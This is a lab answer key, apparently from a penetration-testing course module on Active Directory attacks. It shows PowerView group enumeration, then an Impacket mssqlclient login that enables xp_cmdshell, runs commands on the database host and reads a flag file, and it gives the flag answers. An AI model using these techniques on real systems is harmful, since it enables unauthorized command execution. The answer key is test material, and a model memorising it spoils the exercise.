# Section 23: Privileged Access

Module: 13. Active Directory Enumeration & Attacks

---

## Questions & Answers

### 1. What other user in the domain has CanPSRemote rights to a host?

Context:
```powershell
PS C:\Tools> Get-DomainGroupMember -Identity "Remote Management Users"


GroupDomain             : INLANEFREIGHT.LOCAL
GroupName               : Remote Management Users
GroupDistinguishedName  : CN=Remote Management Users,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL
MemberDomain            : INLANEFREIGHT.LOCAL
MemberName              : bdavis
MemberDistinguishedName : CN=Brian Davis,OU=Server Admin,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
MemberObjectClass       : user
MemberSID               : S-1-5-21-3842939050-3880317879-2865463114-1162
```

**Answer:** `bdavis`

---

### 2. What host can this user access via WinRM? (just the computer name)

**Answer:** `ACADEMY-EA-DC01`

---

### 3. Leverage SQLAdmin rights to authenticate to the ACADEMY-EA-DB01 host (172.16.5.150). Submit the contents of the flag at C:\Users\damundsen\Desktop\flag.txt.

Context:
```bash
┌─[htb-student@ea-attack01]─[~]
└──╼ $mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL> help

     lcd {path}                 - changes the current local directory to {path}
     exit                       - terminates the server process (and this session)
     enable_xp_cmdshell         - you know what it means
     disable_xp_cmdshell        - you know what it means
     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
     ! {cmd}                    - executes a local shell cmd
     
SQL> enable_xp_cmdshell
[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL> xp_cmdshell whoami /priv
output                                                                             

--------------------------------------------------------------------------------   

NULL                                                                               

PRIVILEGES INFORMATION                                                             

----------------------                                                             

NULL                                                                               

Privilege Name                Description                               State      

============================= ========================================= ========   

SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   

SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   

SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    

SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled    

SeImpersonatePrivilege        Impersonate a client after authentication Enabled    

SeCreateGlobalPrivilege       Create global objects                     Enabled    

SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled   

NULL                                                                               

SQL> xp_cmdshell cat C:\Users\damundsen\Desktop\flag.txt
output                                                                             

--------------------------------------------------------------------------------   

'cat' is not recognized as an internal or external command,                        

operable program or batch file.                                                    

NULL                                                                               

SQL> xp_cmdshell type C:\Users\damundsen\Desktop\flag.txt
output                                                                             

--------------------------------------------------------------------------------   

1m_the_sQl_@dm1n_n0w!                                                              

SQL> 
```

**Answer:** `1m_the_sQl_@dm1n_n0w!`

---

[Back to Module Index](./README.md)
